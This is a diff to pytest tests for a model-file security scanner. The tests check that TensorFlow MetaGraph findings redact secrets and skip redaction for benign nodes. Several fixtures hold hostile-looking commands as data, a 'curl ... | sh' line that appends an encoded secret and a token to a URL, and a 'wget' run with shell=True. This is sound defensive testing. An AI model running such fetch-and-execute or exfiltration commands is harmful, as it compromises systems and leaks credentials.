@@ -11,6 +11,7 @@ import pytest
 from modelaudit.cache import get_cache_manager, reset_cache_manager
 from modelaudit.core import determine_exit_code, scan_model_directory_or_file
 from modelaudit.scanner_results import INCONCLUSIVE_SCAN_OUTCOME
+from modelaudit.scanners._evidence_redaction import redact_evidence_string as _redact_evidence_string
 from modelaudit.scanners.base import IssueSeverity
 from modelaudit.scanners.tf_metagraph_scanner import (
     _MAX_ATTR_VALUE_BYTES,
@@ -430,6 +431,39 @@ def test_tf_metagraph_scanner_benign_graph_has_no_security_findings(tmp_path: Pa
     assert result.metadata.get("graph_node_count") == 2
 
 
+def test_tf_metagraph_scanner_skips_redaction_for_non_finding_evidence(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    """Clean and explicitly benign nodes should not enter the evidence redaction path."""
+    benign_meta = tmp_path / "benign-redaction.meta"
+    benign_meta.write_bytes(
+        _build_metagraph(
+            graph_nodes=[
+                {"name": "plain_const", "op": "Const", "attrs": {"summary": "public metadata"}},
+                {"name": "checkpoint", "op": "SaveV2", "attrs": {"filename": "public-checkpoint"}},
+            ],
+            collection_bytes={"public_notes": [b"public metadata"]},
+        )
+    )
+    redaction_calls = 0
+
+    def count_redaction_calls(text: str, max_chars: int | None = 180) -> str:
+        nonlocal redaction_calls
+        redaction_calls += 1
+        return _redact_evidence_string(text, max_chars=max_chars)
+
+    monkeypatch.setattr(
+        "modelaudit.scanners.tf_metagraph_scanner.redact_evidence_string",
+        count_redaction_calls,
+    )
+
+    result = TensorFlowMetaGraphScanner().scan(str(benign_meta))
+
+    assert result.success is True
+    assert redaction_calls == 0
+
+
 def test_tf_metagraph_scanner_detects_unsafe_ops_and_executable_payload_signals(tmp_path: Path) -> None:
     malicious_meta = tmp_path / "malicious.meta"
     malicious_meta.write_bytes(
@@ -476,10 +510,15 @@ def test_tf_metagraph_scanner_detects_unsafe_ops_and_executable_payload_signals(
 def test_tf_metagraph_scanner_redacts_sensitive_previews_and_examples(tmp_path: Path) -> None:
     sensitive_url = "https://example.com/p.sh?X-Amz-Signature=SECRET123&safe=1"
     path_token = "Aa1Bb2Cc3Dd4Ee5Ff6Gg7Hh8Ii9Jj0"
+    encoded_secret = "Q" * 160
+    github_token = f"ghp_{'a' * 36}"
     legacy_aws_access_key = "AKIAEXAMPLEACCESSKEY"
     legacy_signature = "LEGACYSIGNATURE"
     ftps_password = "FTPSPASSWORD"
-    sensitive_command = f"python -c \"import os; os.system('curl {sensitive_url} | sh')\" client_secret=supersecret"
+    sensitive_command = (
+        f"python -c \"import os; os.system('curl {sensitive_url}&data={encoded_secret} | sh')\" "
+        f"client_secret=supersecret --data {github_token}"
+    )
     sensitive_meta = tmp_path / "sensitive-preview.meta"
     sensitive_meta.write_bytes(
         _build_metagraph(
@@ -519,6 +558,8 @@ def test_tf_metagraph_scanner_redacts_sensitive_previews_and_examples(tmp_path: 
     assert "supersecret" not in serialized_result
     assert "rawtoken" not in serialized_result
     assert path_token not in serialized_result
+    assert encoded_secret not in serialized_result
+    assert github_token not in serialized_result
     assert "GCSSECRET" not in serialized_result
     assert "nodesecret" not in serialized_result
     assert "attrsecret" not in serialized_result
@@ -538,6 +579,7 @@ def test_tf_metagraph_scanner_redacts_sensitive_previews_and_examples(tmp_path: 
 
 def test_tf_metagraph_scanner_preserves_benign_public_preview_context(tmp_path: Path) -> None:
     public_url = "https://example.com/p.sh?variant=public"
+    public_context = f"subprocess.run('wget {public_url}', shell=True) markers ghp_short sk-proj-example"
     public_meta = tmp_path / "public-preview.meta"
     public_meta.write_bytes(
         _build_metagraph(
@@ -545,7 +587,7 @@ def test_tf_metagraph_scanner_preserves_benign_public_preview_context(tmp_path: 
                 {
                     "name": "pyfunc_node",
                     "op": "PyFunc",
-                    "attrs": {"script": f"subprocess.run('wget {public_url}', shell=True)"},
+                    "attrs": {"script": public_context},
                 }
             ]
         )
@@ -555,7 +597,7 @@ def test_tf_metagraph_scanner_preserves_benign_public_preview_context(tmp_path: 
     executable_checks = [check for check in result.checks if check.name == "MetaGraph Executable String Check"]
 
     assert len(executable_checks) == 1
-    assert executable_checks[0].details["value_preview"] == f"subprocess.run('wget {public_url}', shell=True)"
+    assert executable_checks[0].details["value_preview"] == public_context
 
 
 def test_tf_metagraph_scanner_inspects_collection_payload_through_collection_limit(tmp_path: Path) -> None:
@@ -734,7 +776,18 @@ def test_tf_metagraph_scanner_detects_split_encoded_payload_and_oversized_attrs(
     result = TensorFlowMetaGraphScanner().scan(str(suspicious_meta))
 
     assert result.success is False
-    assert any(issue.message and "Encoded payload indicator found" in issue.message for issue in result.issues)
+    encoded_payload_issues = [
+        issue for issue in result.issues if issue.message and "Encoded payload indicator found" in issue.message
+    ]
+    assert encoded_payload_issues
+    serialized_result = json.dumps(
+        {
+            "checks": [check.to_dict() for check in result.checks],
+            "issues": [issue.to_dict() for issue in result.issues],
+        }
+    )
+    assert encoded_blob not in serialized_result
+    assert encoded_payload_issues[0].details["value_preview"] == "<redacted>"
     assert any(
         issue.message
         and "Large executable-context attribute detected" in issue.message
